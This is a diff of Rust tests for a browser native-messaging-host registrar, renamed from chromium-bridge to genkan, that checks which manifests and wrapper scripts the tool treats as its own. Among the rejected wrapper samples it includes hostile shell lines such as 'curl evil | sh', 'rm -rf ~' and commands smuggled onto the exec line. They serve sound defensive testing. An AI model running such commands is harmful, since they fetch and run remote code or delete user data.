@@ -21,7 +21,7 @@ impl TempTree {
 fn registrar(tree: &TempTree) -> Registrar {
     // A real file at the host_exe path, so an assess() of what we wrote
     // reports Ok rather than a dangling launch path.
-    let exe = tree.path("bin/chromium-bridge");
+    let exe = tree.path("bin/genkan");
     fs::create_dir_all(exe.parent().unwrap()).unwrap();
     fs::write(&exe, "#!/bin/sh\n").unwrap();
     Registrar {
@@ -189,7 +189,7 @@ fn register_writes_manifest_and_labeled_wrapper() {
     let script = fs::read_to_string(&wrapper).unwrap();
     assert!(wrapper_is_ours(&script), "{script}");
     assert!(script.contains("--label 'chrome'"));
-    assert!(script.contains(&*tree.path("bin/chromium-bridge").to_string_lossy()));
+    assert!(script.contains(&*tree.path("bin/genkan").to_string_lossy()));
 
     #[cfg(unix)]
     {
@@ -378,20 +378,29 @@ fn unreadable_manifest_path_fails_closed() {
 
 #[test]
 fn ownership_is_exact_description_match() {
-    // install.sh wrote this exact description (no marker suffix).
-    let legacy = format!(
-        r#"{{"name":"{NATIVE_HOST_ID}","description":"Chromium Bridge native messaging host","path":"/x/run-host.sh","type":"stdio","allowed_origins":["chrome-extension://{PINNED_EXTENSION_ID}/"]}}"#
+    // The marker this engine writes, verbatim.
+    let ours = format!(
+        r#"{{"name":"{NATIVE_HOST_ID}","description":"Genkan native messaging host (managed by genkan)","path":"/x/run-host.sh","type":"stdio","allowed_origins":["chrome-extension://{PINNED_EXTENSION_ID}/"]}}"#
     );
-    assert_eq!(manifest_ownership(&legacy), Ownership::Ours);
+    assert_eq!(manifest_ownership(&ours), Ownership::Ours);
     // Same shape under another host id is foreign.
     assert!(matches!(
-        manifest_ownership(&legacy.replace(NATIVE_HOST_ID, "com.other.host")),
+        manifest_ownership(&ours.replace(NATIVE_HOST_ID, "com.other.host")),
         Ownership::Foreign(_)
     ));
-    // A description that merely STARTS with our prefix is not ours.
-    let prefixed = legacy.replace(
-        "Chromium Bridge native messaging host",
-        "Chromium Bridge native messaging host - unrelated fork",
+    // The marker's own prefix without the suffix is not ours: no installer ever wrote it.
+    let unmarked = ours.replace(
+        "Genkan native messaging host (managed by genkan)",
+        "Genkan native messaging host",
+    );
+    assert!(matches!(
+        manifest_ownership(&unmarked),
+        Ownership::Foreign(_)
+    ));
+    // A description that merely STARTS with our marker is not ours.
+    let prefixed = ours.replace(
+        "Genkan native messaging host (managed by genkan)",
+        "Genkan native messaging host (managed by genkan) - unrelated fork",
     );
     assert!(matches!(
         manifest_ownership(&prefixed),
@@ -404,68 +413,68 @@ fn ownership_is_exact_description_match() {
 }
 
 #[test]
-fn wrapper_ownership_requires_the_exec_trampoline_shape() {
-    // Ours (current shape, with marker comment).
-    assert!(wrapper_is_ours(
-        "#!/usr/bin/env bash\n# managed by chromium-bridge; safe to delete\nexec '/x/chromium-bridge' --native-host --label 'chrome'\n"
-    ));
-    // Legacy install.sh shape (no comment).
-    assert!(wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /x/chromium-bridge --native-host\n"
+fn wrapper_ownership_requires_the_marked_exec_trampoline_shape() {
+    // The shape this engine writes: shebang, marker line, one exec trampoline.
+    let marked =
+        |body: &str| format!("#!/usr/bin/env bash\n# managed by genkan; safe to delete\n{body}");
+    assert!(wrapper_is_ours(&marked(
+        "exec '/x/genkan' --native-host --label 'chrome'\n"
+    )));
+    // A trampoline without the marker line is not ours: no installer ever wrote one.
+    assert!(!wrapper_is_ours(
+        "#!/usr/bin/env bash\nexec /x/genkan --native-host\n"
     ));
     // A script that merely MENTIONS --native-host in a comment is not ours.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\n# --native-host\nrm -rf ~/important\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "# --native-host\nrm -rf ~/important\n"
+    )));
     // Extra payload beyond the trampoline is not ours.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\ncurl evil | sh\nexec /x/y --native-host\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "curl evil | sh\nexec /x/y --native-host\n"
+    )));
     // Wrong shebang is not ours.
-    assert!(!wrapper_is_ours("#!/bin/sh\nexec /x/y --native-host\n"));
+    assert!(!wrapper_is_ours(
+        "#!/bin/sh\n# managed by genkan; safe to delete\nexec /x/y --native-host\n"
+    ));
     // Two exec lines are not ours.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /a --native-host\nexec /b --native-host\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "exec /a --native-host\nexec /b --native-host\n"
+    )));
     // A compound command smuggled onto the exec line is not ours.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /x --native-host; curl evil | sh\n"
-    ));
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /x --native-host && rm -rf ~\n"
-    ));
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec $(pick-a-binary) --native-host\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "exec /x --native-host; curl evil | sh\n"
+    )));
+    assert!(!wrapper_is_ours(&marked(
+        "exec /x --native-host && rm -rf ~\n"
+    )));
+    assert!(!wrapper_is_ours(&marked(
+        "exec $(pick-a-binary) --native-host\n"
+    )));
     // Extra argv smuggled between path and flag is not a trampoline.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /bin/sh -c 'touch /tmp/pwn' --native-host\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "exec /bin/sh -c 'touch /tmp/pwn' --native-host\n"
+    )));
     // A malformed label is not ours either.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /x --native-host --label 'bad label'\n"
-    ));
+    assert!(!wrapper_is_ours(&marked(
+        "exec /x --native-host --label 'bad label'\n"
+    )));
     // Word expansion (brace, glob, tilde) unquoted is not shell-literal.
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /tmp/{a,b} --native-host\n"
-    ));
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /tmp/pwn-* --native-host\n"
-    ));
-    assert!(!wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec ~/other-binary --native-host\n"
-    ));
+    assert!(!wrapper_is_ours(&marked("exec /tmp/{a,b} --native-host\n")));
+    assert!(!wrapper_is_ours(&marked("exec /tmp/pwn-* --native-host\n")));
+    assert!(!wrapper_is_ours(&marked(
+        "exec ~/other-binary --native-host\n"
+    )));
     // Quoted, those same characters are literal and fine.
-    assert!(wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec '/tmp/odd {dir}/chromium-bridge' --native-host\n"
-    ));
+    assert!(wrapper_is_ours(&marked(
+        "exec '/tmp/odd {dir}/genkan' --native-host\n"
+    )));
     // Legitimate paths with spaces pass, quoted or backslash-escaped.
-    assert!(wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec '/Users/My Name/.chromium-bridge/chromium-bridge' --native-host --label 'chrome'\n"
-    ));
-    assert!(wrapper_is_ours(
-        "#!/usr/bin/env bash\nexec /Users/My\\ Name/.chromium-bridge/chromium-bridge --native-host\n"
-    ));
+    assert!(wrapper_is_ours(&marked(
+        "exec '/Users/My Name/.genkan/genkan' --native-host --label 'chrome'\n"
+    )));
+    assert!(wrapper_is_ours(&marked(
+        "exec /Users/My\\ Name/.genkan/genkan --native-host\n"
+    )));
 }
 
 #[test]
@@ -546,7 +555,7 @@ fn system_scope_registers_into_the_system_roots_once_per_shared_directory() {
     let dirs = tree_dirs(&tree);
     let entries = browsers::resolve(Os::Linux, &dirs);
     let install_dir = browsers::install_dir(Os::Linux, &dirs, Scope::System);
-    assert_eq!(install_dir, tree.path("sys/var/lib/chromium-bridge"));
+    assert_eq!(install_dir, tree.path("sys/var/lib/genkan"));
 
     let targets =
         select_targets(&crate::cli::FixTargets::Detected, &entries, Scope::System).unwrap();
@@ -577,8 +586,8 @@ fn system_scope_registers_into_the_system_roots_once_per_shared_directory() {
     for target in &targets {
         reg.register(target).unwrap();
     }
-    let manifest = tree
-        .path("sys/etc/opt/chrome/native-messaging-hosts/com.vivswan.chromium_bridge.host.json");
+    let manifest =
+        tree.path("sys/etc/opt/chrome/native-messaging-hosts/com.vivswan.genkan.host.json");
     let parsed: serde_json::Value =
         serde_json::from_str(&fs::read_to_string(&manifest).unwrap()).unwrap();
     // Chrome's directory has two readers, so its wrapper is unlabeled (the rule is `Target`'s); Vivaldi's
@@ -586,14 +595,13 @@ fn system_scope_registers_into_the_system_roots_once_per_shared_directory() {
     let wrapper = install_dir.join("run-host.sh");
     assert_eq!(parsed["path"], wrapper.to_string_lossy().as_ref());
     assert!(!fs::read_to_string(&wrapper).unwrap().contains("--label"));
-    let vivaldi: serde_json::Value =
-        serde_json::from_str(
-            &fs::read_to_string(tree.path(
-                "sys/etc/vivaldi/native-messaging-hosts/com.vivswan.chromium_bridge.host.json",
-            ))
-            .unwrap(),
+    let vivaldi: serde_json::Value = serde_json::from_str(
+        &fs::read_to_string(
+            tree.path("sys/etc/vivaldi/native-messaging-hosts/com.vivswan.genkan.host.json"),
         )
-        .unwrap();
+        .unwrap(),
+    )
+    .unwrap();
     assert_eq!(
         vivaldi["path"],
         install_dir
@@ -757,8 +765,8 @@ fn macos_chrome_and_brave_share_one_user_manifest_and_keep_their_own_pointers() 
     assert_eq!(
         fs::read_to_string(&wrapper).unwrap(),
         format!(
-            "#!/usr/bin/env bash\n# managed by chromium-bridge; safe to delete\nexec {} --native-host\n",
-            shell_quote(&tree.path("bin/chromium-bridge").to_string_lossy())
+            "#!/usr/bin/env bash\n# managed by genkan; safe to delete\nexec {} --native-host\n",
+            shell_quote(&tree.path("bin/genkan").to_string_lossy())
         )
     );
     let manifest: serde_json::Value =
@@ -768,7 +776,7 @@ fn macos_chrome_and_brave_share_one_user_manifest_and_keep_their_own_pointers() 
         manifest,
         serde_json::json!({
             "name": NATIVE_HOST_ID,
-            "description": "Chromium Bridge native messaging host (managed by chromium-bridge)",
+            "description": "Genkan native messaging host (managed by genkan)",
             "path": wrapper,
             "type": "stdio",
             "allowed_origins": [format!("chrome-extension://{PINNED_EXTENSION_ID}/")],
@@ -822,7 +830,7 @@ fn macos_chrome_and_brave_share_one_user_manifest_and_keep_their_own_pointers() 
 #[test]
 fn a_windows_registration_is_its_key() {
     let tree = TempTree::new();
-    let launch = tree.path("bin/chromium-bridge");
+    let launch = tree.path("bin/genkan");
     fs::create_dir_all(launch.parent().unwrap()).unwrap();
     fs::write(&launch, "").unwrap();
     let ours = format!(r#"{{"path":{:?}}}"#, launch.to_string_lossy());
@@ -1005,13 +1013,13 @@ fn system_scope_refuses_a_binary_other_accounts_cannot_launch() {
     let cases: Vec<(&str, PathBuf, Option<&str>)> = vec![
         (
             "a package binary",
-            place("usr/local/bin/chromium-bridge", &[("usr", 0o755)], 0o755),
+            place("usr/local/bin/genkan", &[("usr", 0o755)], 0o755),
             None,
         ),
         (
             "a binary under a private home",
             place(
-                "home/user/.local/lib/chromium-bridge/chromium-bridge",
+                "home/user/.local/lib/genkan/genkan",
                 &[("home/user", 0o700)],
                 0o755,
             ),
@@ -1019,12 +1027,8 @@ fn system_scope_refuses_a_binary_other_accounts_cannot_launch() {
         ),
         (
             "an owner-only binary in a public directory",
-            place(
-                "opt/example/chromium-bridge",
-                &[("opt/example", 0o755)],
-                0o700,
-            ),
-            Some("chromium-bridge is not readable and executable"),
+            place("opt/example/genkan", &[("opt/example", 0o755)], 0o700),
+            Some("genkan is not readable and executable"),
         ),
     ];
     for (case, exe, refusal) in cases {
@@ -1161,7 +1165,7 @@ fn cli_guidance_offers_the_reason_and_only_flags_the_scope_accepts() {
             .collect();
         assert!(offered.contains(&"--browser"), "{scope:?}: {cli}");
         for flag in offered {
-            let mut argv = vec!["chromium-bridge", "doctor", "--fix", flag];
+            let mut argv = vec!["genkan", "doctor", "--fix", flag];
             match flag {
                 "--browser" => argv.push("chrome"),
                 "--manifest-dir" => argv.push(&dir),
@@ -1188,7 +1192,7 @@ fn symlinked_install_dir_is_refused() {
     let link = tree.path("install");
     std::os::unix::fs::symlink(&real, &link).unwrap();
     let reg = Registrar {
-        host_exe: tree.path("bin/chromium-bridge"),
+        host_exe: tree.path("bin/genkan"),
         install_dir: link,
         scope: RegistrarScope::User,
         foreign: ForeignManifest::Replace,
